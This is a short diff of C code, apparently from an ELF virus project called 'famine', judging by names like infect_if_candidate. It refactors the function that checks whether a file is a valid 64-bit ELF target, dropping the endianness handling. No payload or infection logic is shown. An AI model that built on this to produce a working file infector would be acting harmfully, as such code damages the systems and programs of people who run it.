@@ -17,8 +17,7 @@
 #include "errors.h"
 #include "utils.h"
 
-static bool	elf64_identifier(const Elf64_Ehdr *hdr, \
-			struct endians_pointer *endians)
+static bool	elf64_identifier(const Elf64_Ehdr *hdr)
 {
 	if (ft_memcmp(hdr->e_ident, (char[4]){ELFMAG0, ELFMAG1, ELFMAG2, ELFMAG3}, SELFMAG) != 0 // wrong Magic
 	|| hdr->e_ident[EI_CLASS] != ELFCLASS64           // not 64bit
@@ -26,9 +25,6 @@ static bool	elf64_identifier(const Elf64_Ehdr *hdr, \
 	|| hdr->e_phoff == 0                              // no program hdr table
 	|| hdr->e_shoff == 0)                             // no section hdr table
 		return false;
-
-	// set endian for the future
-	set_endian(endians, hdr->e_ident[EI_DATA] == ELFDATA2MSB);
 
 	return true;
 }
@@ -48,7 +44,7 @@ inline bool	infect_if_candidate(const char *file)
 		famine_close(fd);
 		return errors(ERR_USAGE, '8','2');
 	}
-	if (elf64_identifier(&elf64_hdr, &food.endians) == false)
+	if (elf64_identifier(&elf64_hdr) == false)
 	{
 		famine_close(fd);
 		return errors(ERR_USAGE, '8','3');
